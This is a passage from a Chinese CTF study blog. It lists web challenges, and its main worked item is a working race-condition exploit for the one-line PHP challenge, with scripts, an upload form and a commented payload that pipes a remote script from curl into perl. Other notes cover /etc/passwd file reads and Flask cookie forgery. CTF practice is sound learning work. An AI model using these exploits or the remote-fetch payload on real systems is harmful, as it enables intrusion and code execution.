punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-GXYCTF2019-BabysqliV3-0"><a href="#3-2-GXYCTF2019-BabysqliV3-0" class="headerlink" title="3.2  [GXYCTF2019]BabysqliV3.0"></a>3.2  [GXYCTF2019]BabysqliV3.0</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>简析GXY_CTF “BabySqli v3.0”之Phar反序列化  <a href="https://www.gem-love.com/ctf/490.html#LFI%E8%AF%BB%E6%BA%90%E7%A0%81" target="_blank" rel="noopener">https://www.gem-love.com/ctf/490.html#LFI%E8%AF%BB%E6%BA%90%E7%A0%81</a></p><h2 id="3-3-2019强网杯upload"><a href="#3-3-2019强网杯upload" class="headerlink" title="3.3  2019强网杯upload"></a>3.3  2019强网杯upload</h2><p><strong>参考资料：</strong></p><p>1、<a href="https://www.zhaoj.in/read-5873.html#comment-5033" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html#comment-5033</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>practice_5.1training</title>
      <link href="/2020/04/30/practice-5.1training/"/>
      <url>/2020/04/30/practice-5.1training/</url>
      
        <content type="html"><![CDATA[<h1 id="五一特训，٩꒰▽-꒱۶⁼³₌₃-学习去咯！！！"><a href="#五一特训，٩꒰▽-꒱۶⁼³₌₃-学习去咯！！！" class="headerlink" title="五一特训，٩꒰▽ ꒱۶⁼³₌₃ 学习去咯！！！"></a>五一特训，٩꒰▽ ꒱۶⁼³₌₃ 学习去咯！！！</h1><p><a href="http://106.15.93.118/challenges" target="_blank" rel="noopener">http://106.15.93.118/challenges</a></p><h1 id="1-ezphp"><a href="#1-ezphp" class="headerlink" title="1. ezphp"></a>1. ezphp</h1><p><strong>链接：</strong></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><h1 id="2-hardjs"><a href="#2-hardjs" class="headerlink" title="2. hardjs"></a>2. hardjs</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30002/login" target="_blank" rel="noopener">http://203.195.224.127:30002/login</a></p><p><strong>考点：</strong>javascript原型链污染</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup：<a href="https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/#more</a></p><p><strong>2、</strong>prototype-pollution-notes：<a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p><p><strong>3、</strong>javascript原型链污染详解：<a href="https://wulidecade.cn/2019/04/15/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E8%AF%A6%E8%A7%A3(%E5%90%8E%E6%9C%89%E5%BD%A9%E8%9B%8B)/" target="_blank" rel="noopener">https://wulidecade.cn/2019/04/15/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E8%AF%A6%E8%A7%A3(%E5%90%8E%E6%9C%89%E5%BD%A9%E8%9B%8B)/</a></p><h1 id="3-hardphp"><a href="#3-hardphp" class="headerlink" title="3. hardphp"></a>3. hardphp</h1><p><strong>链接：</strong><a href="http://114.55.93.141:12345/" target="_blank" rel="noopener">http://114.55.93.141:12345/</a></p><p><strong>考点：</strong></p><p><strong>1、</strong>代码审计</p><p><strong>2、</strong>ssti模板注入</p><p><strong>3、</strong>SSRF TO RCE IN Mysql</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup：<a href="https://forum.90sec.com/t/topic/397" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/397</a></p><p><strong>2、</strong>php curl curl_getinfo()返回参数详解：<a href="https://www.cnblogs.com/zqifa/p/php-curl-3.html" target="_blank" rel="noopener">https://www.cnblogs.com/zqifa/p/php-curl-3.html</a></p><p><strong>3、</strong>URI和URL的区别：<a href="https://www.jianshu.com/p/ba15d066f777" target="_blank" rel="noopener">https://www.jianshu.com/p/ba15d066f777</a></p><p><strong>4、</strong>blackhat：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><p><strong>5、</strong>经典面试题：从浏览器地址栏输入网址，到网页彻底打开，中间经历了什么：</p><p><a href="https://www.cnblogs.com/xieshengdev/p/10063882.html" target="_blank" rel="noopener">https://www.cnblogs.com/xieshengdev/p/10063882.html</a></p><p><strong>6、</strong>URL各部分详解  <a href="https://blog.csdn.net/weixin_42246997/article/details/102782616" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42246997/article/details/102782616</a></p><h1 id="4-one-line-php-challenge"><a href="#4-one-line-php-challenge" class="headerlink" title="4. one-line-php-challenge"></a>4. one-line-php-challenge</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30005/" target="_blank" rel="noopener">http://203.195.224.127:30005/</a></p><p><strong>考点：</strong>base64加解密原理+session文件上传</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>hitcon 2018受虐笔记一:one-line-php-challenge 学习：<a href="https://www.codercto.com/a/33740.html" target="_blank" rel="noopener">https://www.codercto.com/a/33740.html</a></p><p><strong>2、</strong>hitcon2018 One Line PHP Challenge ：<a href="https://www.joyk.com/dig/detail/1540387853494766" target="_blank" rel="noopener">https://www.joyk.com/dig/detail/1540387853494766</a></p><p><strong>3、</strong>hitcon2018 One Line PHP Challenge ： <a href="https://www.shukaiming.com/article/528" target="_blank" rel="noopener">https://www.shukaiming.com/article/528</a></p><p><strong>4、</strong>Real World CTF Of “The Return of One Line PHP Challenge”  <a href="https://www.codercto.com/a/43464.html" target="_blank" rel="noopener">https://www.codercto.com/a/43464.html</a></p><p>（王一航？？？）</p><p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>  <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'orange'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> @<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'@&lt;?php'</span> <span class="token operator">?</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-1-思路"><a href="#4-1-思路" class="headerlink" title="4.1 思路"></a>4.1 思路</h2><p>利用PHP_SESSION_UPLOAD_PROGRESS上传session文件，但session文件头总是upload_progress_，判断语句过不去，就想到用伪协议多次base64解码使得@&lt;?php前面的内容正好为空，所以相当于要分两步走。</p><p><strong>第一步</strong>  构造upload_progress_再加上两个字符，正好16个字符，是4的倍数，要用脚本爆破出符合要求的那两个字符。</p><p><strong>第二步</strong>  @&lt;?php及后面的内容也是要base64解码3次的，所以也要进行构造出合适的经3次base64加密的字符串。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//解码演示</span><span class="token comment" spellcheck="true">//一般第一次解密就只剩下4个可见字符了</span><span class="token comment" spellcheck="true">//第二次解密就没有可见字符了，根本就不用等到第三次解密</span><span class="token comment" spellcheck="true">//exp:     upload_progress_ZB</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"upload_progress_"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#str_shrffle()随机地打乱字符串中的所有字符</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s_length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z /]|s'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ss_length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z /]|s'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sss</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s_length</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ss_length</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$sss</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s_length</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$ss</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$ss_length</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">from</span> random <span class="token keyword">import</span> sample<span class="token punctuation">,</span> randint<span class="token comment" spellcheck="true">#payload = '@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?>'</span>payload <span class="token operator">=</span> <span class="token string">'@&lt;?php echo `cat /flag`;?>'</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    junk <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#从序列a中随机抽取n个元素，这里的序列a为string.ascii_letters，n为randint(1, 24),并将n个元素生以list形式返回。</span>    x <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>payload <span class="token operator">+</span> junk<span class="token punctuation">)</span>    xx <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>payload <span class="token operator">+</span> junk<span class="token punctuation">)</span><span class="token punctuation">)</span>    xxx <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>payload <span class="token operator">+</span> junk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'='</span> <span class="token operator">not</span> <span class="token keyword">in</span> x <span class="token operator">and</span> <span class="token string">'='</span> <span class="token operator">not</span> <span class="token keyword">in</span> xx <span class="token operator">and</span> <span class="token string">'='</span> <span class="token operator">not</span> <span class="token keyword">in</span> xxx<span class="token punctuation">:</span>        <span class="token keyword">print</span> xxx        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第三步</strong>    大概思路</p><p>1、上传的html脚本，value处写构造内容，如：ZBVVVSM0wyTkhhSGRKUjFacVlVYzRaMWxIVG1oa1EwRjJXbTE0YUZveVFUZFFlalZv。上传文件尽可能大，我上传的文件大小大概是2MB。PHPSESSID处自定义。</p><p>2、session存储路径为/var/lib/php/sessions/，用伪协议访问，?orange=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_name</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://47.112.158.20:30004/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-orange大佬的脚本改良版"><a href="#4-2-orange大佬的脚本改良版" class="headerlink" title="4.2 orange大佬的脚本改良版"></a>4.2 orange大佬的脚本改良版</h2><p>还是用脚本比较高端、大气、上档次！！！</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">from</span> random <span class="token keyword">import</span> sample<span class="token punctuation">,</span> randint<span class="token keyword">from</span> multiprocessing<span class="token punctuation">.</span>dummy <span class="token keyword">import</span> Pool <span class="token keyword">as</span> ThreadPoolHOST <span class="token operator">=</span> <span class="token string">'http://47.112.158.20:30004/'</span>sess_name <span class="token operator">=</span> <span class="token string">'iamorange'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>     <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID='</span> <span class="token operator">+</span> sess_name<span class="token punctuation">}</span>payload <span class="token operator">=</span> <span class="token string">'@&lt;?php echo `cat /flag`;?>'</span><span class="token comment" spellcheck="true">#这里记得要有echo</span><span class="token comment" spellcheck="true"># while 1:</span><span class="token comment" spellcheck="true">#     junk = ''.join(sample(string.ascii_letters, randint(1, 24)))</span><span class="token comment" spellcheck="true">#     x = b64encode(payload + junk)</span><span class="token comment" spellcheck="true">#     xx = b64encode(b64encode(payload + junk))</span><span class="token comment" spellcheck="true">#     xxx = b64encode(b64encode(b64encode(payload + junk)))</span><span class="token comment" spellcheck="true">#     if '=' not in x and '=' not in xx and '=' not in xxx:</span><span class="token comment" spellcheck="true">#         print xxx</span><span class="token comment" spellcheck="true">#         break</span><span class="token keyword">def</span> <span class="token function">runner1</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'ZB'</span> <span class="token operator">+</span> <span class="token string">'VVVSM0wyTkhhSGRKUjFacVlVYzRaMWxIVG1oa1EwRjJXbTE0YUZveVFUZFFlalZv'</span>    <span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">'C:\Users\hacker\Desktop\kong.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#这里的文件要尽可能大</span>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'f'</span><span class="token punctuation">:</span> fp<span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">runner2</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> <span class="token string">'/var/lib/php/sessions/sess_'</span> <span class="token operator">+</span> sess_name    filename <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span> <span class="token operator">%</span> filename    <span class="token comment" spellcheck="true"># print filename</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'%s?orange=%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        c <span class="token operator">=</span> r<span class="token punctuation">.</span>content        <span class="token keyword">if</span> b<span class="token string">'flag'</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>    runner <span class="token operator">=</span> runner1<span class="token keyword">else</span><span class="token punctuation">:</span>    runner <span class="token operator">=</span> runner2pool <span class="token operator">=</span> ThreadPool<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># result = pool.map_async(runner, range(32) ).get(0xffff)</span>result <span class="token operator">=</span> pool<span class="token punctuation">.</span>map_async<span class="token punctuation">(</span>runner<span class="token punctuation">,</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/30/practice-5.1training/one-line-php-challenge.png" alt="one-line-php-challenge"></p><h1 id="5-ssrfme-（python代码审计）"><a href="#5-ssrfme-（python代码审计）" class="headerlink" title="5. ssrfme （python代码审计）"></a>5. ssrfme （python代码审计）</h1><p><strong>链接：</strong><a href="http://114.55.93.141:30003/" target="_blank" rel="noopener">http://114.55.93.141:30003/</a></p><p><strong>考点：</strong>ssrf</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>BUUCTF WEB [De1CTF 2019]SSRF Me  <a href="https://blog.csdn.net/qq_42967398/article/details/103549258" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/103549258</a></p><p><strong>2、</strong>De1CTF ssrf_me 的三种解法  <a href="https://xz.aliyun.com/t/5927#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5927#toc-3</a></p><h2 id="5-1-思路"><a href="#5-1-思路" class="headerlink" title="5.1 思路"></a>5.1 思路</h2><p>绕过限定条件：</p><p>1、action处要求既有read，又要有scan；</p><p>2、秘钥secret未知，但要求param、action和sign满足固定的条件，所以就要根据字符串拼接进行伪造绕过</p><p>3、param=flag.txt，过程中会把沙箱里的result.txt内容写到flag.txt，如果我们满足条件，最后访问就拿到了flag。</p><h2 id="5-2-注意事项"><a href="#5-2-注意事项" class="headerlink" title="5.2 注意事项"></a>5.2 注意事项</h2><p>burp构造发包时，Cookie处格式为：Cookie:action=readscan;sign=72375f30ec54455edd643858eaef4529</p><p>写python脚本时，则为cookies=content，content处为一个构造的字典。</p><h1 id="6-readme-（cookie伪造）"><a href="#6-readme-（cookie伪造）" class="headerlink" title="6. readme （cookie伪造）"></a>6. readme （cookie伪造）</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30007/" target="_blank" rel="noopener">http://203.195.224.127:30007/</a></p><p><strong>考点：</strong>ssrf</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup1：<a href="https://www.cnblogs.com/kevinbruce656/p/12638984.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevinbruce656/p/12638984.html</a></p><p><strong>2、</strong>writeup2：<a href="https://cloud.tencent.com/developer/article/1611142" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1611142</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/13/BUUCTF-Writeup-%E4%B8%80/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/13/BUUCTF-Writeup-%E4%B8%80/</a></p><h2 id="6-1-思路"><a href="#6-1-思路" class="headerlink" title="6.1 思路"></a>6.1 思路</h2><p>看到/read?url=这里的read，联想到是python框架，url后面接一个/etc/passwd，可以看到是一个任意文件读取，再去读/app/app.py，看到源代码。</p><p>uuid.getnode()得到本机的mac地址，并转为整数。路径为/sys/class/net/eth0/address，访问得到，并要转为16进制，就是去掉所有分号并在最前面加上一个0x；</p><p>然后计算str(random.random()*233)得到密钥，并且只有将密钥截取到小数点后9位才能成功，神奇，36.280453523。（其实解密的时候是不需要密钥的！）</p><pre class="line-numbers language-python"><code class="language-python">python flask<span class="token operator">*</span><span class="token number">3.</span>py decode <span class="token operator">-</span>s <span class="token operator">-</span>c  <span class="token comment" spellcheck="true">#解密，根据解密结果修改后进行加密</span>python flask<span class="token operator">*</span><span class="token number">3.</span>py encode <span class="token operator">-</span>s <span class="token operator">-</span>t  <span class="token comment" spellcheck="true">#加密</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>带着伪造的session访问/flag即可。</p><h1 id="7-easypython"><a href="#7-easypython" class="headerlink" title="7. easypython"></a>7. easypython</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30004/" target="_blank" rel="noopener">http://203.195.224.127:30004/</a></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup：<a href="https://www.cnblogs.com/wangtanzhi/p/12181032.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12181032.html</a></p><p><strong>2、</strong> SUCTF 2019 Writeup — De1ta ：<a href="https://xz.aliyun.com/t/6042#toc-24" target="_blank" rel="noopener">https://xz.aliyun.com/t/6042#toc-24</a></p><p><strong>3、</strong>urlparse和urlsplit函数用法：<a href="https://blog.csdn.net/weixin_41684949/article/details/94619328" target="_blank" 